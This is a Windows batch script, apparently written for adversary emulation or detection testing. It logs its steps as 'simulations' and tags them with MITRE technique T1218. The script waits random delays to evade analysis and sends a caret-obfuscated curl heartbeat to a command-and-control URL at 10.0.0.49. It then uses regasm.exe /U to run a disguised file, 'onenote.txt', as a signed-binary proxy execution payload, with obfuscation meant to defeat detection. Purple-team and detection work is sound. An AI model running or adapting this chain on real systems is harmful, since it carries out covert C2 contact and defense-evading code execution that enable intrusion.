@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable names with PHR_ placeholders as values (plain literals)
SET txisnba=%APPDATA%\8226\15c13bde
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8226-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=onenote.txt
SET dvhhyc=8226

REM Additional variables for logging
SET yvjxks=%APPDATA%\!rrocubc!\macula-simulations.log
SET zqkplm=!dvhhyc!

REM Initial random delay 30-60 seconds
SET /A bfyshr=%RANDOM% %% 30 + 30
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start=!bfyshr!s>>> "!yvjxks!" 2>nul
timeout /t !bfyshr! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>>> "!yvjxks!" 2>nul

REM 1. C2 HEARTBEAT using curl with escaped command
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>>> "!yvjxks!" 2>nul
SET hbcmd1=cur^l
SET hbcmd2= -^k -s -o n^ul "!keghkgto!"
CALL !hbcmd1!!hbcmd2!
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_success>>> "!yvjxks!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_failed=!ERRORLEVEL!>>> "!yvjxks!" 2>nul
)

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=10s>>> "!yvjxks!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete>>> "!yvjxks!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>>> "!yvjxks!" 2>nul
cd /d "!txisnba!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET cdir=!CD!
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_success=!cdir!>>> "!yvjxks!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_failed=!ERRORLEVEL!>>> "!yvjxks!" 2>nul
)

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=8s>>> "!yvjxks!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete>>> "!yvjxks!" 2>nul

REM 3. Execute DLL with regasm.exe /U using heavy escape obfuscation
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_start>>> "!yvjxks!" 2>nul

REM Build escaped regasm command fragments
SET rgsm1=r^e^g
SET rgsm2=a^s^m
SET rgsm3=.e^x^e
SET arg1=/^U
SET arg2=!xzanpex!

REM Combine and execute with full path
FOR %%I IN ("%windir%\Microsoft.NET\Framework\v4.0.30319\regasm.exe") DO SET fullpath=%%~fI
IF NOT EXIST "!fullpath!" (
    FOR %%I IN ("%windir%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe") DO SET fullpath=%%~fI
)

IF EXIST "!fullpath!" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_found=!fullpath!>>> "!yvjxks!" 2>nul
    
    SET cmdpart1=!fullpath!
    SET cmdpart2= !arg1! "!arg2!"
    
    CALL !cmdpart1!!cmdpart2!
    SET ttp_result=!ERRORLEVEL!
    
    IF !ttp_result! EQU 0 (
        SET result=1
        SET err_detail=
        echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_success>>> "!yvjxks!" 2>nul
    ) ELSE (
        SET result=0
        SET err_detail=exit_!ttp_result!
        echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_failed=!ttp_result!>>> "!yvjxks!" 2>nul
    )
    
    REM TTP logging for T1218
    SET ttp_id=T1218
    SET ttp_name=Signed_Binary_Proxy_Execution
    
    REM Normalize timestamp to YYYY-MM-DD HH:MM:SS.SSS
    FOR /F "tokens=1-4 delims=/-. " %%A IN ("!DATE!") DO (
        SET yyyy=%%C
        SET mm=%%A
        SET dd=%%B
    )
    FOR /F "tokens=1-3 delims=:.," %%A IN ("!TIME!") DO (
        SET hh=%%A
        SET min=%%B
        SET sec=%%C
        SET msec=000
    )
    
    echo [!yyyy!-!mm!-!dd! !hh!:!min!:!sec!.!msec!][!jwcnifl!]: !rrocubc!-!zqkplm!-!ttp_id!|!ttp_name!=!result!:!err_detail!>> "!yvjxks!" 2>nul || (
        echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: ttp_log_failed>>> "!yvjxks!" 2>nul
    )
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_not_found>>> "!yvjxks!" 2>nul
    SET result=0
    SET err_detail=regasm_not_found
    echo [%DATE% %TIME%][!jwcnifl!]: !rrocubc!-!zqkplm!-T1218|Signed_Binary_Proxy_Execution=0:!err_detail!>> "!yvjxks!" 2>nul || (
        echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: ttp_log_failed>>> "!yvjxks!" 2>nul
    )
)

REM Final random delay
SET /A finaldel=%RANDOM% %% 15 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start=!finaldel!s>>> "!yvjxks!" 2>nul
timeout /t !finaldel! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete>>> "!yvjxks!" 2>nul

ENDLOCAL